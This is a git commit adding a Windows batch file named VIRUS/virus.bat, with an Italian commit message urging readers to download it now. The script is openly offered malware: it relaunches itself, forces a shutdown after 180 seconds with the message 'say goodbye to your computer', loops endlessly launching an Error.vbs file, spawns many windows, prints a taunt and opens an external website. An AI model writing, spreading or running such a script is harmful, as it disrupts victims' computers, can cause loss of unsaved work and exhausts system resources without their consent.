4ddbe65a818c8051cb3dbcece96704536bafab7a
NEBBIX6 <113458222+NEBBIX6@users.noreply.github.com>
2022-10-26 16:52:03 +0200

    scaricalo
    ora

---
+++ VIRUS/virus.bat
@@ -0,0 +1,34 @@
+COLOR 0a
+start C:\Users\utente\OneDrive\Desktop\virus.bat
+@echo off
+
+echo di addio al tuo pc 
+
+shutdown -s -f -t 180 /c "di addio al tuo computer"
+
+@echo off
+:SCROOL
+start Error.vbs
+goto SCROOL
+
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+
+@echo off 
+
+echo hai.vinto.un.nfire.selvatico
+
+timeout 40
+
+explorer https://piv.pivpiv.dk/
+
